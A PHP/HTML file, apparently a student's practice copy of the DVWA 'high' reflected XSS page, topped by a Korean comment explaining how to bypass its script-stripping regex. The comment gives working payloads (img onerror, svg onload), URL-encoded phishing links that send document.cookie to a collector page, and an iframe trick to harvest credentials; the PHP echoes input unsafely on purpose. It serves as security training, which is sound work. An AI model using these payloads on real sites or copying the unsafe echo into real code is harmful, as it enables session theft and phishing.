<!--
https://webhack.dynu.net/?idx=20161227.001&print=friendly
들어온 정보를 대소문자 가리지않고 특정 순서로 오면 싹다 지우는 방법이다.
그러나 이 또한 뚫린다
왜냐면 xss는 막지만 공격법을 바꾸면 같은 효과를 낼 수 있다.
대표적으로 html 인젝션이 있다

<img src=x onerror=alert(document.cookie)>
onerror 라는 함수는 문자의 오류가 났을 시 지정된 함수를 발동시키는 함수이다.
<svg onload=window.locatin.assign("https://www.naver.com/")>


그렇다면 이 경우는 어떻게 활용되어 공격할까?
이 경우는 csrf 와 같은 방식으로 피싱을 많이 이용한다
이메일의 링크를 조작하여 피싱하는데
<img width="0" height="0" src="x" onerror="document.location='http://localhost/3.dvwa/10.XSS%20(Reflected)/XSS-r.php?'+document.cookie">
을 먼저 삽입시킨 주소를 이메일에 링크로 둔갑하여 피해자에게 보낸다
ex)
http://localhost/3.dvwa/10.XSS%20(Reflected)/10-1.XSS%20(Reflected).php?name=%3Cimg+width%3D%220%22+height%3D%220%22+src%3D%22x%22+onerror%3D%22document.location%3D%27http%3A%2F%2Flocalhost%2F3.dvwa%2F10.XSS%2520%28Reflected%29%2FXSS-r.php%3F%27%2Bdocument.cookie%22%3E&user_token=d549faa7227ab98fba408113bdde8be6#
피해자가 둔갑된 링크를 누르게 되면
해커의 사이트로 쿠키값이 전송된다.


세션 쿠키에 대해서 HttpOnly가 설정된 경우에는 XSS를 이용한 세션탈취가 어렵다

위 경우 html 인젝션을 이요하는데
<iframe>을 이용하여 마치 원래 사이트가 제공하는 것처럼 유도하는 것이다.
위 경우 해커의 사이트를 좀 더 디테일하게 만든다면 정교하게 속일 수 있다.

아래의 실습은 본래 세션탈취가 어렵다는 점을 살려하는게 맞으나
위 실습과 같이 연결해서 해보자

먼저의 위의 방식처럼 먼저 메일을 보낸다.
처음 쿠키값을 탈취후에
<iframe>을 이용하여 더 그럴 듯하게 만들어진 사이트를 불러와 마치 하나의 사이트인 거처럼 상대를 속인다
<iframe width=600 height=400 src="http://localhost/3.dvwa/1.brutefource/0.get/1-1.bru-GET.php"></iframe>

메일
<img width="0" height="0" src="x" onerror="document.location='http://localhost/3.dvwa/10.XSS%20(Reflected)/XSS-r2.php?'+document.cookie">
가 삽입된
http://localhost/3.dvwa/10.XSS%20(Reflected)/10-1.XSS%20(Reflected).php?name=%3Cimg+width%3D%220%22+height%3D%220%22+src%3D%22x%22+onerror%3D%22document.location%3D%27http%3A%2F%2Flocalhost%2F3.dvwa%2F10.XSS%2520%28Reflected%29%2FXSS-r2.php%3F%27%2Bdocument.cookie%22%3E
을 둔갑하여 보내면 아이디 , 패쓰워드 , 쿠키까지 모두 탈취할수 있다.



-->


<!DOCTYPE html>

<html>

<head>
    <meta content="text/html; charset=UTF-8" />
</head>

<body class="home">
<div class="body_padded">
    <h1>Vulnerability: Reflected Cross Site Scripting (XSS) - high</h1>

    <div class="vulnerable_code_area">
        <form name="XSS" action="#" method="GET">
            <p>
                What's your name?
                <input type="text" name="name">
                <input type="submit" value="Submit">
            </p>

        </form>

    </div>


    <?php

    header ("X-XSS-Protection: 0");
    $b = setcookie("cookie",md5( uniqid() ), time()+300);
    // Is there any input?
    if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
        // Get input
        $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

        //
        //      preg_replace("/찾을 문자/", "변경할 문자", "해당하는 문자열");
        //      preg_replace( '/ ...  /i', '', $_GET[ 'name' ] );
        //      preg_replace( '/<(.*)s(.*)c(.*)r /i', '', $_GET[ 'name' ] );
        //      (.*)문자(.*)문자  >>  해당 문자만 지워줌

        // Feedback for end user
        echo "<pre>Hello ${name}</pre>";
    }

    ?>


</div>
</body>

</html>
